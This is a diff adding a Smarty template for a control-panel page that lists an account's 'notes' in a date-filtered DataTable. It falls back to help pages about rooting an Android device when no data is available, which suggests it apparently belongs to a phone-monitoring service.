@@ -1,0 +1,178 @@
+<style type="text/css">
+    @media (max-width: 767px) {
+        .daterangepickerWrapper {
+            margin-top: 10px;
+        }
+    }
+
+    .nav.nav-pills {
+        margin-top: 10px;
+    }
+</style>
+<div>
+    <h1 class="text-center">{$title}</h1>
+
+    {insert "inc.flashMessages.htm"}
+
+    {if !$paid}
+        {insert "cp/updatePackage.html"}
+    {elseif count($accountsList)}
+        <div class="row form-inline">
+            <div class="col-lg-6 col-md-6 col-sm-6">
+                <div class="form-group">
+                    <label for="account">{$di.t->_('Account')}</label>
+                    {include "scripts/select.htm" name="account" id="account" class="form-control" keys=$accountsList values=$accountsList}
+                </div>
+            </div>
+            <div class="col-lg-6 col-md-6 col-sm-6">
+                <div class="daterangepickerWrapper">
+                    <div id="reportrange" class="btn btn-default pull-right">
+                        <i class="fa fa-calendar fa-lg"></i>
+                        <span></span>
+                        <b class="caret"></b>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    <div class="table-container">
+        <table class="dataTable" id="datatable" aria-describedby="datatables_info">
+            <thead>
+                <tr role="row">
+                    <th>{$di.t->_('Date')}</th>
+                    <th>{$di.t->_('Title')}</th>
+                </tr>
+            </thead>
+        </table>
+    </div>
+    <script>
+        $(document).ready(function() {
+            var selectRanges = {
+                "{$di.t->_('Today')}": [moment().startOf('day'), moment().endOf('day')],
+                "{$di.t->_('Yesterday')}": [moment().subtract('days', 1).startOf('day'), moment().subtract('days', 1).endOf('day')],
+                "{$di.t->_('Last 7 Days')}": [moment().subtract('days', 6).startOf('day'), moment().endOf('day')],
+                "{$di.t->_('Last 30 Days')}": [moment().subtract('days', 29).startOf('day'), moment().endOf('day')],
+                "{$di.t->_('This Month')}": [moment().startOf('month'), moment().endOf('month')],
+                "{$di.t->_('Last Month')}": [moment().subtract('month', 1).startOf('month'), moment().subtract('month', 1).endOf('month')]
+            };
+
+            var notes = {
+                startDate: moment().subtract('days', 29).startOf('day'),
+                endDate: moment().endOf('day'),
+                linkTemplate: _.template('<a href="{$di.router->getRouteUrl("notes")}/<%= account %>/<%= time %>"><%= date %></a>'),
+                table: null,
+                setRange: function(start, end) {
+                    this.range = [start, end];
+
+                    if (start.isValid() && start.isValid()) {
+                        this.startDate = start;
+                        this.endDate = end;
+                        $('#reportrange span').html(start.format('LL') + ' - ' + end.format('LL'));
+
+                        _.find(selectRanges, function(period, name) {
+                            if ((moment(period[0]).format('l') === start.format('l')) && (moment(period[0]).format('l') === start.format('l'))) {
+                                $('#reportrange span').html(name);
+                                return true;
+                            }
+                            return false;
+                        });
+
+                        var url = '{$di.config.domain}/cp/notes?';
+
+                        return url + $.param({
+                            account: $('#account').val(),
+                            timeFrom: moment(start).unix(),
+                            timeTo: moment(end).unix()
+                        });
+                    } else {
+                        return setRange(this.startDate, this.endDate);
+                    }
+                },
+                initTable: function() {
+                    var table = $('#datatable').dataTable({
+                        bProcessing: true,
+                        bServerSide: true,
+                        sAjaxSource: this.setRange(this.startDate, this.endDate),
+                        bPaginate: true,
+                        bFilter: false,
+                        bSort: true,
+                        bInfo: true,
+                        bAutoWidth: false,
+                        bSortMulti: false,
+                        iDisplayLength: {$authData.records_per_page},
+                        aaSorting: [[0, 'desc']],
+                        oLanguage: {
+                            sUrl: '{$di.config.staticDomain}/datatables/language/{$di.t->getLocale()}.txt'
+                        },
+                        aoColumns: [
+                            {
+                                mData: null,
+                                sWidth: '180px',
+                                fnRender: function(obj) {
+                                    return notes.linkTemplate({
+                                        account: encodeURIComponent($('#account').val()),
+                                        time: obj.aData[0],
+                                        date: moment(obj.aData[0] * 1000){if isset($customUtcOffset)}.zone({$customUtcOffset}){/if}.format('lll')
+                                    });
+                                }
+                            },
+                            {
+                                fnRender: function(obj) {
+                                    return _.escape(obj.aData[1]);
+                                }
+                            }
+                        ],
+                        fnDrawCallback: function() {
+                            notes.table = table;
+                            $(this).find('tbody').tableScroll();
+                        }
+                    });
+                },
+                reloadTable: function(url) {
+                    this.table.fnReloadAjax(url);
+                }
+            };
+
+            notes.initTable();
+
+            $('#account').change(function() {
+                notes.reloadTable(notes.setRange(notes.startDate, notes.endDate));
+            });
+
+            $('#reportrange').daterangepicker({
+                ranges: selectRanges,
+                startDate: notes.startDate,
+                endDate: moment().endOf('day'),
+                format: 'LL',
+                locale: {
+                    applyLabel: "{$di.t->_('Apply')}",
+                    cancelLabel: "{$di.t->_('Cancel')}",
+                    fromLabel: "{$di.t->_('From')}",
+                    toLabel: "{$di.t->_('To')}",
+                    customRangeLabel: "{$di.t->_('Custom Range')}",
+                    daysOfWeek: moment.langData()._weekdaysMin.slice(),
+                    monthNames: (function() {
+                        var res = [];
+                        for (var i = 0; i < 12; i++) {
+                            res.push(moment([0, i]).format('MMM'));
+                        }
+                        return res;
+                    })(),
+                    firstDay: moment.langData()._week.dow
+                }
+            }, function(from, to) {
+                notes.reloadTable(notes.setRange(from, to));
+            });
+        });
+    </script>
+    {else}
+        {if $di.currentDevice.os=='android' && !$di.currentDevice.rooted}
+            {include "content/{$di.t->getLocale()}/rootPhone.html"}
+        {elseif $di.currentDevice.os=='android' && $di.currentDevice.app_version > 6 && $di.currentDevice.rooted && !$di.currentDevice.rootAccess}   
+            {include "content/{$di.t->getLocale()}/rootAccessPhone.html"}    
+        {else}
+            <h3>{$di.t->_('Waiting for notes... Why can the data be unavailable?')}</h3>
+            {include "content/{$di.t->getLocale()}/noData.html"}
+        {/if}
+    {/if}
+</div>
